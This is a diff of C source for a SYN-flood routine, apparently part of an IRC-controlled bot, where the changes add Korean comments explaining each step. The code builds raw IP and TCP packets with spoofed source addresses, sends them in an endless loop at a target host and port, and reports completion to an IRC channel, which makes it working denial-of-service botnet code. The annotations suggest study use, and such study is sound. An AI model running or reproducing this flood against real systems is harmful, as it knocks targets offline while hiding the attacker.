@@ -32,7 +32,7 @@ void synflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
     unsigned long saddr, daddr, secs;
     time_t start = time(NULL);
 
-	/* 소켓 열기 */
+	/* 먼저 소켓을 만들기 */
     if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
         exit(EXIT_FAILURE); {
         int i;
@@ -45,7 +45,8 @@ void synflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
     daddr = dest_addr;
     secs = ntime;
 
-	/* IP 패킷과 TCP 패킷 형성 */
+	/* IP 패킷과 TCP 패킷 형성1 */
+	/* 패킷의 체크섬을 계산하기 위하여, attack.h에 슈도 헤더 구조를 정의함*/
     send_tcp.ip.ihl = 5;
     send_tcp.ip.version = 4;
     send_tcp.ip.tos = 16;
@@ -65,27 +66,30 @@ void synflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
     send_tcp.tcp.syn = 1;
     send_tcp.tcp.window = 30845;
     send_tcp.tcp.urg_ptr = 0;
-    dest = htons(dest_port);
+    dest = htons(dest_port); // 목적지 포트
 
     while (1) {
+		/* 소스 포트와 목적지 포트값 설정(랜덤) */
         source = rand();
         if (dest_port == 0) dest = rand();
         
         if (srchost == 0) saddr = get_spoofed();
         else saddr = srchost;
 
+		/* IP 패킷과 TCP 패킷 형성2 */
 		/* 변경해야 하는 필드들을 설정 */
+		/* 합법적 인 SYN 패킷처럼 보이도록 할당 된 메모리를 채운다*/
         send_tcp.ip.tot_len = htons(40 + psize);
         send_tcp.ip.id = rand();
-        send_tcp.ip.saddr = saddr;
-        send_tcp.ip.daddr = daddr;
-        send_tcp.ip.check = 0;
-        send_tcp.tcp.source = source;
-        send_tcp.tcp.dest = dest;
+        send_tcp.ip.saddr = saddr; // 소스 IP 주소
+        send_tcp.ip.daddr = daddr; // 목적지 IP 주소
+        send_tcp.ip.check = 0;		// 체크섬을 계산하기 전에 0으로 셋팅
+        send_tcp.tcp.source = source; // source 포트
+        send_tcp.tcp.dest = dest; // 목적지 포트
         send_tcp.tcp.seq = rand();
         send_tcp.tcp.check = 0;
 
-		/* sin 구조체 설정 */
+		/* sockaddr_in 구조체(sin 구조체)를 만들고 값을 채운다 */
         sin.sin_family = AF_INET;
         sin.sin_port = dest;
         sin.sin_addr.s_addr = send_tcp.ip.daddr;
@@ -99,16 +103,21 @@ void synflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
         send_tcp.buf[12] = ((char *)&check)[3];
 
 		/* 슈도 헤더 필드들 설정*/
+		/* 합법적 인 SYN 패킷처럼 보이도록 할당 된 메모리를 채운다*/
         pseudo_header.source_address = send_tcp.ip.saddr;
         pseudo_header.dest_address = send_tcp.ip.daddr;
         pseudo_header.placeholder = 0;
         pseudo_header.protocol = IPPROTO_TCP;
         pseudo_header.tcp_length = htons(20 + psize);
+
         bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
         bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
+		/*  TCP/IP 헤더의 체크섬을 계산한다 */
         send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32 + psize);
+		/* sendto()함수를 사용하여서 패킷을 보낸다. */
         sendto(get, &send_tcp, 40 + psize, 0, (struct sockaddr *)&sin, sizeof(sin));
 
+		/* synflooding이 성공했을때*/
         if (a >= 50) {
             if (time(NULL) >= start + secs) {
                 sockwrite(sp->sockfd, "PRIVMSG %s :[nsynflood] packeting completed!\n", channel);
